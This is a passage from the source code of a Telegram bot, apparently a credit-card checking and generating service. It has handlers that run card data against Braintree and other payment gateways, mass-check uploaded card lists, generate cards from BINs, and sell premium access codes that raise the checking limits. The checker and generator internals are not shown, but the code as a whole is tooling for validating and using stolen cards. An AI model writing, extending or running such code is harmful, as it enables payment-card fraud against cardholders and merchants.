        stop_success = False
        
        if target_user_id in stop_controllers:
            stop_controllers[target_user_id].stop()
            logger.info(f"Stop controller activated for {target_user_id}")
            stop_success = True
        
        if target_user_id in active_checks:
            active_checks[target_user_id] = False
            logger.info(f"Active checks stopped for {target_user_id}")
            stop_success = True
        
        if target_user_id in user_files:
            user_files[target_user_id]['force_stop'] = True
            logger.info(f"Force stop set for {target_user_id}")
            stop_success = True
        
        if stop_success:
            await query.edit_message_text(
                "🛑 EMERGENCY STOP ACTIVATED!\n\n" +
                "✅ Checking process terminated immediately!\n" +
                "📊 All resources freed!\n" +
                "🔧 Ready for new file upload!",
                parse_mode='Markdown'
            )
            logger.info(f"User {user_id} successfully stopped check {target_user_id}")
        else:
            await query.answer("❌ No active check found to stop!", show_alert=True)
        
    elif callback_data.startswith('cancel_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        
        if user_id in user_files:
            del user_files[user_id]
        
        await query.edit_message_text("❌ Check cancelled!")
        
    elif callback_data == "check_join":
        await handle_join_callback(update, context)
        
    elif callback_data.startswith("again|"):
        bin_input = callback_data.split("|", 1)[1]
        username = query.from_user.username or "anonymous"
        text = generate_output(bin_input, username)

        btn = InlineKeyboardMarkup()
        btn.add(InlineKeyboardButton("♻️ Re-Generate", callback_data=f"again|{bin_input}"))

        try:
            await query.edit_message_text(text=text, parse_mode="HTML", reply_markup=btn)
        except:
            await context.bot.send_message(query.message.chat.id, text, parse_mode="HTML", reply_markup=btn)

    elif callback_data.startswith("retry_chk|"):
        cc_data = callback_data.split("|", 1)[1]
        username = query.from_user.username or "anonymous"
        
        try:
            await query.edit_message_text("🔄 Re-checking with Gateway...", parse_mode="HTML")
        except:
            pass
        
        await asyncio.sleep(1)
        result = premium_checker.check_braintree(cc_data)
        
        status_icon = "✅" if result['status'] == 'success' else "❌" if result['status'] == 'declined' else "⚠️"
        risk_color = "🟢" if result.get('risk_level') == 'LOW' else "🟡" if result.get('risk_level') == 'MEDIUM' else "🔴"
        
        response_text = f"""
🔐 PREMIUM GATEWAY CHECK
────────────────────
🎯 Status: {status_icon} {result['status'].upper()}
📨 Message: {result['message']}
🔧 Gateway: {result['gateway']}
📟 Response Code: {result['response_code']}
⚠️ Risk Level: {risk_color} {result.get('risk_level', 'UNKNOWN')}

⏱️ Processing:
🚀 Time: {result['processing_time']}s
🕐 Timestamp: {result['timestamp']}
────────────────────
👤 Requested By: @{username}
⚡ Premium Checker
"""
        
        btn = InlineKeyboardMarkup()
        btn.add(InlineKeyboardButton("🔄 Retry Check", callback_data=f"retry_chk|{cc_data}"))
        btn.add(InlineKeyboardButton("🌐 Multi-Check", callback_data=f"multi_chk|{cc_data}"))
        
        try:
            await query.edit_message_text(response_text, parse_mode="HTML", reply_markup=btn)
        except:
            await context.bot.send_message(query.message.chat.id, response_text, parse_mode="HTML", reply_markup=btn)

    elif callback_data.startswith("multi_chk|"):
        cc_data = callback_data.split("|", 1)[1]
        username = query.from_user.username or "anonymous"
        
        try:
            await query.edit_message_text("🔄 Starting Multi-Gateway Analysis...", parse_mode="HTML")
        except:
            pass
        
        results = premium_checker.check_all_gateways(cc_data)
        
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        total_count = len(results)
        
        response_text = f"""
🔰 PREMIUM MULTI-GATEWAY ANALYSIS
────────────────────
📊 Summary: {success_count}/{total_count} Gateways Approved
📈 Success Rate: {(success_count/total_count)*100:.1f}%

🎯 Gateway Results:
"""
        
        for gateway, result in results.items():
            status_icon = "✅" if result['status'] == 'success' else "❌" if result['status'] == 'declined' else "⚠️"
            response_text += f"\n{gateway.upper():12} {status_icon} {result['message']} ({result['processing_time']}s)"
        
        response_text += f"""
────────────────────
💳 Card: <code>{cc_data.split('|')[0][:6]}XXXXXX{cc_data.split('|')[0][-4:]}</code>
👤 User: @{username}
⚡ Premium Multi-Checker
"""
        
        btn = InlineKeyboardMarkup()
        btn.add(InlineKeyboardButton("🔄 Re-Analyze", callback_data=f"multi_chk|{cc_data}"))
        btn.add(InlineKeyboardButton("📊 Single Check", callback_data=f"retry_chk|{cc_data}"))
        
        try:
            await query.edit_message_text(response_text, parse_mode="HTML", reply_markup=btn)
        except:
            await context.bot.send_message(query.message.chat.id, response_text, parse_mode="HTML", reply_markup=btn)

async def handle_join_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    
    if not await check_channel_membership(user_id, context):
        await query.answer("❌ You haven't joined the channel yet!", show_alert=True)
        return
    
    await query.answer("✅ Access Granted!")
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
Welcome To Premium Multi-Gateway Bot 

✅ Access Granted

📊 Your Status: {user_status.upper()}

🔧 Available Commands:

• Use /chk To Check Single Cards
• Use /gen To Generate Premium Cards
• Just Upload Any File in .txt Format
• Use /redeem To Get Premium Access

💎 Credits: @BLAZE_X_007
    """
    
    await query.edit_message_text(welcome_text)

async def id_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    await update.message.reply_text(f"🆔 Your User ID: `{user_id}`", parse_mode='Markdown')

async def mtxt_manual_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    await update.message.reply_text("""
How To Use Mass Checking 

1. Upload any file in .txt format 💎

2. Bot Auto Detect Your File And Send You Message 😎

3. Then Click On Check Cards Button ⏳
    """)

def generate_premium_code(days):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO premium_codes (code, days, created_at) VALUES (?, ?, ?)", (code, days, time.time()))
    conn.commit()
    conn.close()
    return code

async def code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Owner command only!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /code <days>")
        return
    try:
        days = int(context.args[0])
        code = generate_premium_code(days)
        await update.message.reply_text(f"""
💎 Premium Code Generated!
Code: `{code}`
Duration: {days} days
Usage: /redeem {code}
        """, parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Invalid days format!")

async def redeem_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /redeem <code>")
        return
    code = context.args[0].upper()
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT days FROM premium_codes WHERE code=? AND used_by IS NULL", (code,))
    result = c.fetchone()
    if not result:
        await update.message.reply_text("❌ Invalid or already used code!")
        conn.close()
        return
    days = result[0]
    expires_at = time.time() + (days * 24 * 60 * 60)
    c.execute("UPDATE premium_codes SET used_by=? WHERE code=?", (user_id, code))
    c.execute("UPDATE users SET status='premium' WHERE user_id=?", (user_id,))
    c.execute("INSERT INTO redeemed (user_id, code, redeemed_at, expires_at) VALUES (?, ?, ?, ?)", (user_id, code, time.time(), expires_at))
    conn.commit()
    conn.close()
    expiry_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M:%S")
    await update.message.reply_text(f"""
🎉 Premium Activated!
✅ You are now a Premium User!
📅 Expires: {expiry_date}
🔧 Features unlocked:
   • Mass check limit: {PREMIUM_LIMIT} CCs
   • Priority processing
💎 Thank you for supporting!
    """)

async def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    sent, failed = 0, 0
    for (user_id,) in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"""
📢 Broadcast Complete!
✅ Sent: {sent}
❌ Failed: {failed}
    """)

async def handle_custom_commands(update: Update, context: CallbackContext):
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    if text.startswith('.'):
        parts = text[1:].split(maxsplit=1)
        if not parts:
            return
            
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if command == 'start':
            await start_command(update, context)
        elif command == 'chk':
            if args:
                context.args = [args]
            else:
                context.args = []
            await chk_command(update, context)
        elif command == 'gen':
            if args:
                context.args = [args]
            else:
                context.args = []
            await gen_handler(update, context)
        elif command == 'mchk':
            if args:
                context.args = [args]
            else:
                context.args = []
            await multi_check_handler(update, context)
        elif command == 'fake':
            if args:
                context.args = [args]
            else:
                context.args = []
            await fake_handler(update, context)
        elif command == 'mtxt':
            await mtxt_manual_command(update, context)
        elif command == 'id':
            await id_command(update, context)
        elif command == 'code':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await code_command(update, context)
        elif command == 'redeem':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await redeem_command(update, context)
        elif command == 'broadcast':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await broadcast_command(update, context)
        elif command == 'stats':
            await stats_command(update, context)
        elif command == 'cmds':
            await cmds_handler(update, context)

async def error_handler(update: Update, context: CallbackContext):
    logger.error(f"Exception while handling an update: {context.error}")
    
    try:
        if OWNER_ID:
            error_msg = f"🚨 Bot Error:\n{context.error}"
            await context.bot.send_message(chat_id=OWNER_ID, text=error_msg)
    except:
        pass

def main():
    init_db()
    
    application = Application.builder().token(TOKEN).build()
    
    application.add_error_handler(error_handler)
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_handler))
    application.add_handler(CommandHandler("gen", gen_handler))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", multi_check_handler))
    application.add_handler(CommandHandler("all", multi_check_handler))
    application.add_handler(CommandHandler("fake", fake_handler))
    application.add_handler(CommandHandler("mtxt", mtxt_manual_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("code", code_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_custom_commands))
    
    application.add_handler(CallbackQueryHandler(handle_button))
    
    print("🤖 HYBRID PREMIUM BOT STARTED!")
    print("🎯 Multi-Gateway System: ACTIVE")
    print("📁 Mass File Processing: ACTIVE") 
    print("🚀 Military Stop Controls: ACTIVE")
    print("💎 Premium Features: ENABLED")
    print("🔧 Bot Token: Configured")
    print("👑 Owner ID:", OWNER_ID)
    print("⚡ Features: Multi-Gateway + Mass Check + Premium Generator")
    print("📱 Bot is now running...")
    print("🤖 Developer: @BLAZE_X_007")
    
    while True:
        try:
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                timeout=30,
                pool_timeout=30
            )
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            print(f"🚨 Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)
            print("🔄 Restarting bot now...")

if __name__ == '__main__':
    main()